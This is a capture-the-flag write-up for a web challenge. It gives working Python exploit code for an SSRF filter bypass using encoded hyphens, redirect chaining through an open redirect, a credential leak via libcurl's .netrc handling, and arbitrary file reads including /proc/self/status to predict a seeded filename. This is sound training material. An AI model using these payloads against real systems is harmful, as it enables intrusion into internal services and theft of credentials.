# Single Sign Off

**Category:** Web  
---

## 1. Architecture

3 services behind nginx:
- **nite-sso** (:8989) - Login service with open redirect
- **document-portal** (:10000) - URL fetcher (SSRF)
- **nite-vault** (internal only) - Stores flag

---

## 2. Bypass SSRF Filter

document-portal blocks `nite-vault` in URL:
```python
if 'nite-vault' in url.lower():
    return "Security Error"
```

**Bypass:** URL encode → `nite%2Dvault`

Python checks string "nite%2Dvault" (no match), but libcurl decodes to "nite-vault" when fetching.

---

## 3. Chain Redirects to Reach Internal Service

nite-vault only allows 127.0.0.1. Use nite-sso open redirect to chain:

```python
def build_chain(final_url, depth=6):
    url = final_url
    for i in range(depth):
        url = f"http://nite-sso:8989/doLogin?username=xxx&password=xxx&redirect_url={quote(url)}"
    return url

target = "http://nite%2Dvault:80/view"
chain = build_chain(target)
fetch(chain)  # SSRF follows redirects → reaches nite-vault
```

---

## 4. Leak Credentials from .netrc

Dockerfile shows `.netrc` contains vault credentials:
```bash
echo 'machine nite-sso' >> /root/.netrc
echo "  login ${NITE_USER}" >> /root/.netrc
echo "  password ${NITE_PASSWORD}" >> /root/.netrc
```

libcurl auto-injects `.netrc` creds when requesting matching host. Leaked creds: `qwertyuiop:SgYJBS9C1b1ohbazlE`

---

## 5. Read /proc/self/status for PID

nite-vault `/view` allows absolute path if authenticated:
```python
if filename.startswith('/'):
    file_path = filename  # No restriction!
```

```python
target = "http://nite%2Dvault:80/view?username=qwertyuiop&password=SgYJBS9C1b1ohbazlE&file=/proc/self/status&"
# Returns: Pid: 21, Uid: 0, Gid: 0
```

---

## 6. Calculate Flag Filename

Flag stored in random filename based on PID/UID/GID:
```python
seed = int(f"{pid}{uid}{gid}")  # "2100" → 2100
random.seed(seed)
random_num = random.randint(100000, 999999)
hash_part = hashlib.sha256(str(random_num).encode()).hexdigest()[:16]
filename = f"{hash_part}.txt"
```

With PID=21, UID=0, GID=0 → predictable filename.

---

## 7. Get Flag

Flag path `/app/nite-vault/secrets/{filename}` also contains `nite-vault` → blocked!

**Double bypass:** Encode hyphen in path too:
```python
# /app/nite%2Dvault/secrets/... 
# Filter sees "nite%2Dvault" (no match), Flask decodes to "nite-vault"
flag_path = f"/app/nite%2Dvault/secrets/{filename}"
target = f"http://nite%2Dvault:80/view?username=qwertyuiop&password=SgYJBS9C1b1ohbazlE&file={flag_path}&"
chain = build_chain(target)
fetch(chain)

# FLAG: nite{r3dir3ct_l3ak_r3p3at}
```

---

## Conclusion:

1. **Filter bypass** - Check happens on string, fetch happens after decode → `%2D` trick
2. **Double bypass** - Filter checks full URL, path also has `nite-vault` → encode both
3. **Internal services** - Use open redirect to pivot through allowed service
4. **libcurl quirks** - Auto `.netrc` injection leaks credentials
5. **Predictable random** - Known seed (PID+UID+GID) = known output
6. **Arbitrary file read** - `/proc/self/status` leaks process info for seed calculation